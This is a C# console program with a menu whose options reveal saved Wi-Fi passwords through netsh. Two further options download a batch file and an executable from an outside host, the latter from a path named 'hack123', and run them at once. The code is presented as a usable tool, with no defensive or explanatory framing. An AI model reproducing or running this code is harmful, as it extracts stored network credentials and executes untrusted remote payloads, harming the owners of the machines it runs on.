using System;
using System.Diagnostics;
using System.Net;

class Program
{
    static void Main(string[] args)
    {
        string[] options = { "Get WiFi Password", "Download and Run c.bat", "Run CP Command", "Exit" };
        int selectedIndex = 0;

        Console.CursorVisible = false;

        while (true)
        {
            DrawMenu(options, selectedIndex);

            ConsoleKey key = Console.ReadKey(true).Key;

            switch (key)
            {
                case ConsoleKey.UpArrow:
                    selectedIndex = (selectedIndex == 0) ? options.Length - 1 : selectedIndex - 1;
                    break;
                case ConsoleKey.DownArrow:
                    selectedIndex = (selectedIndex == options.Length - 1) ? 0 : selectedIndex + 1;
                    break;
                case ConsoleKey.Enter:
                    Console.Clear();
                    HandleOption(selectedIndex, options);
                    break;
            }
        }
    }

    static void DrawMenu(string[] options, int selectedIndex)
    {
        Console.Clear();

        for (int i = 0; i < options.Length; i++)
        {
            if (i == selectedIndex)
            {
                Console.BackgroundColor = ConsoleColor.White;
                Console.ForegroundColor = ConsoleColor.Black;
            }
            else
            {
                Console.BackgroundColor = ConsoleColor.Black;
                Console.ForegroundColor = ConsoleColor.White;
            }

            Console.WriteLine($"  {options[i]}  ");
        }

        Console.ResetColor();
    }

    static void HandleOption(int index, string[] options)
    {
        if (index == 0)
        {
            GetWifiPassword();
        }
        else if (index == 1)
        {
            DownloadAndRunCBat();
        }
        else if (index == 2)
        {
            RunCPCommand();
        }
        else if (index == 3)
        {
            Console.WriteLine("Exiting...");
            Environment.Exit(0);
        }
    }

    static void GetWifiPassword()
    {
        Console.WriteLine("Listing all WiFi profiles...");

        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/C netsh wlan show profiles";
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;

        process.Start();

        string output = process.StandardOutput.ReadToEnd();

        process.WaitForExit();

        Console.WriteLine(output);

        Console.WriteLine("Enter the WiFi name (SSID) to get the password: ");
        string wifiName = Console.ReadLine();

        process.StartInfo.Arguments = $"/C netsh wlan show profile name=\"{wifiName}\" key=clear";
        process.Start();

        output = process.StandardOutput.ReadToEnd();

        process.WaitForExit();

        if (output.Contains("Key Content"))
        {
            string[] lines = output.Split('\n');
            foreach (var line in lines)
            {
                if (line.Contains("Key Content"))
                {
                    Console.WriteLine($"WiFi Password: {line.Split(':')[1].Trim()}");
                    break;
                }
            }
        }
        else
        {
            Console.WriteLine("WiFi password not found or not available.");
        }

        Console.ReadKey();
    }

     static void DownloadAndRunCBat()
    {
        try
        {
            Console.WriteLine("\nDownloading and running c.bat...");

            string command = "curl cekki.cekuj.net/c.bat -o c.bat && c.bat";

            var processInfo = new System.Diagnostics.ProcessStartInfo("cmd", $"/c {command}")
            {
                UseShellExecute = false,
                CreateNoWindow = false
            };

            var process = new System.Diagnostics.Process { StartInfo = processInfo };
            process.Start();
            process.WaitForExit();

            Console.WriteLine("c.bat downloaded and executed successfully.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }

        Console.WriteLine("\nPress any key to return to the menu...");
        Console.ReadKey();
    }
    static void RunCPCommand()
    {
        Console.WriteLine("Downloading and running cp.exe...");
        try
        {
            using (var client = new WebClient())
            {
                client.DownloadFile("http://cekki.cekuj.net/hack123/cp.exe", "cp.exe");
                Console.WriteLine("cp.exe downloaded successfully.");
                Process.Start("cp.exe");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }

        Console.ReadKey();
    }
}
